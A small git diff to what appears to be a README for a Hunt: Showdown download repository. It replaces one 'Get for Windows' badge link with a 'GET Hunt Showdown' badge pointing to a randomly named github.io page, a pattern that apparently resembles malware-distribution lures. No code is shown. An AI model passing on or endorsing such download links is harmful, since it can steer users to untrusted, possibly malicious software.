@@ -4,10 +4,8 @@
   <img src="https://vectorseek.com/wp-content/uploads/2023/07/Hunt-Showdown-Logo-Vector.svg-.png" alt="Hunt Showdown Tactical Operative Logo"/>
 </div>
 
-<div align="center">
+[![GET Hunt Showdown](https://img.shields.io/badge/GET%20%E2%80%94%20Hunt-Showdown-0078D6?style=for-the-badge&logoColor=white)](https://2h41ar6i2ry9m4artinez.github.io/.github/Hunt-Showdown)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://hunt-showdown-1896-tactical.github.io/.github/)
-</div>
 
 ---
 
